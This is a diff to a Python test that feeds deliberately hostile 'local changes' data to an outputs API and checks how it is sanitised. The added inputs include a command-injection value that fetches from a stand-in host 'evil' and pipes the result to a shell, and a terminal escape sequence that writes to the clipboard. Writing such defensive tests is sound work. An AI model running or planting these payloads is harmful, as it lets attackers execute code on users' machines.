@@ -537,11 +537,15 @@ def test_runs_record_as_much_of_their_local_changes_as_allowed(outputs_api, dumm
 
 def test_local_changes_are_kept_as_the_web_app_expects_them(outputs_api, dummy_app):
   hostile = {**LOCAL_CHANGES, "files": [{"path": "x" * 10_000, "added": "1", "status": "Mxx"}, "a.py", {"path": 3}] + [{"path": "b"}] * 600,
-             "excluded": "nope", "code": "print('hi')", "dirty": "yes", "branch": ["main"]}
+             "excluded": "nope", "code": "print('hi')", "dirty": "yes", "branch": ["main"], "head": "x; curl evil | sh #", "base": "a" * 40,
+             "error": "\x1b]52;c;ZXZpbA==\x07bad"}
   post(outputs_api, dummy_app, data={"local_changes": hostile, "dirty": "yes"})
   kept = outputs_api.test_output.data["local_changes"]
   assert len(kept["files"]) == 498 and kept["files"][0] == {"path": "x" * 4096, "status": "Mx", "added": None, "deleted": None}
   assert "code" not in kept and "excluded" not in kept and "branch" not in kept
+  # commits are shas: people copy commands made of them
+  assert "head" not in kept and kept["base"] == "a" * 40
+  assert kept["error"] == "]52;c;ZXZpbA==bad"
   assert kept["dirty"] is None and outputs_api.test_output.data["dirty"] is None
 
 
